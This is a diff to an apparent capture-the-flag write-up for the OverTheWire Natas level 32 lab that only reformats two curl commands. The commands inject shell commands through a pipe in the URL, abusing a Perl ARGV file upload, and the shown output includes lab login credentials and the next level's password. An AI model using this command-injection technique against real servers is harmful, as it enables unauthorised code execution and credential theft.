@@ -9,7 +9,8 @@ This challenge is similar to the previous one with a major difference: The file 
 However, with the parameter `?ls%20-l%20.%20|` in URL, we can see there is a binary file <small>getpassword</small> with `sid` set:
 
 ```shell
-$ curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20\|" -F "file=ARGV" -F "file=@natas32.csv;type=text/csv"
+$ curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20|" \
+       -F "file=ARGV" -F "file=@natas32.csv;type=text/csv"
 ...
 <table class="sortable table table-hover table-striped"><tr><th>.:
 </th></tr><tr><td>total 164
@@ -32,7 +33,8 @@ Note that in the above command, the form data `-F "file=ARGV"` must be ahead of 
 Passing the URL a parameter `./getpassword%20|` will return natas33's password:
 
 ```shell
-$ curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|" -F "file=ARGV" -F "file=@natas32.csv;type=text/csv"
+$ curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|" \
+       -F "file=ARGV" -F "file=@natas32.csv;type=text/csv"
 ...
 <table class="sortable table table-hover table-striped"><tr><th>shoogeiGa2yee3de6Aex8uaXeech5eey
 ```
